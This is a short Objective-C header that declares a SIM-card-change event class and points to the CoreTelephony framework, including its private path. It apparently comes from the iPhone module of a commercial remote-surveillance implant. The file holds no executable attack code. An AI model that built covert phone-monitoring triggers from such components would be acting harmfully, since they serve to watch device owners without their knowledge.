//
//  RCSIEventManagerimChange.h
//  RCSIphone
//
//  Created by kiodo on 13/03/12.
//  Copyright 2012 HT srl. All rights reserved.
//

#import "RCSIEvent.h"

#define CT_FRAMEWORK_PUBLIC  "/System/Library/Frameworks/CoreTelephony.framework/CoreTelephony"
#define CT_FRAMEWORK_PRIVATE "/System/Library/PrivateFrameworks/CoreTelephony.framework/CoreTelephony"

@interface RCSIEventSimChange : RCSIEvent
{
  int simStatus;
}

@property (readwrite) int simStatus;

+ (BOOL)resolveSimChangeSyms;

@end
